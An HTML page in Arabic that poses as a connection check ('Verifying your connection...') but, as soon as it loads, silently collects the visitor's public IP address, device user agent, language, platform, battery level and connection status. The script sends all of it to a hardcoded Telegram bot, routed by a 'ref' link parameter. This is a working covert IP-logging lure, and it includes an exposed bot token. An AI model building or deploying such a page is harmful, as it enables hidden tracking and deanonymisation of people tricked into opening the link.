<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>جارٍ التحقق...</title>
  <script>
    async function getData() {
      const ref = new URLSearchParams(window.location.search).get("ref") || "غير_معروف";
      const ipInfo = await fetch("https://api.ipify.org?format=json").then(res => res.json());
      const device = navigator.userAgent;
      const lang = navigator.language;
      const platform = navigator.platform;
      const online = navigator.onLine ? "متصل" : "غير متصل";
      const battery = await navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}% ${b.charging ? '🔌' : '🔋'}`) || "غير مدعوم";
      const time = new Date().toLocaleString();

      const message = `
📥 تم دخول الرابط:

🆔 المرجع: ${ref}
🌐 IP: ${ipInfo.ip}
📱 الجهاز: ${device}
🌍 اللغة: ${lang}
💻 النظام: ${platform}
🔋 البطارية: ${battery}
📶 الاتصال: ${online}
🕒 الوقت: ${time}
`;

      // إرسال البيانات للبوت الرئيسي
      await fetch(`https://api.telegram.org/bot8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: ref,
          text: message
        })
      });
    }

    getData();
  </script>
</head>
<body>
  <h2 style="text-align:center;margin-top:20%;">📡 يتم التحقق من اتصالك...</h2>
</body>
</html>
